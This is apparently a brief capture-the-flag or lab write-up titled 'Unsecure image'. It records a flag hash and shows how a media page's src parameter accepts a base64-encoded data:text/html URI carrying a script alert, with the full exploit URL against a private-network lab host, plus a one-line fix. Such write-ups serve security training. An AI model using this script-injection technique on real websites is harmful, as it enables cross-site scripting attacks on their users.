Unsecure image
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9

How to find exploit:
From the home page, click the nsa image (3rd image), when we look at the address bar, we notice there is a get request for the image.

How to exploit it:
Encode this script(cript>alert('this works')</script) in base 64:
you get :data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyB3b3JrcycpPC9zY3JpcHQ+. add this in place of the 'nsa' in the address bar.
http://192.168.99.102/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyB3b3JrcycpPC9zY3JpcHQ+

how to fix exploit:
Validate and sanitize user input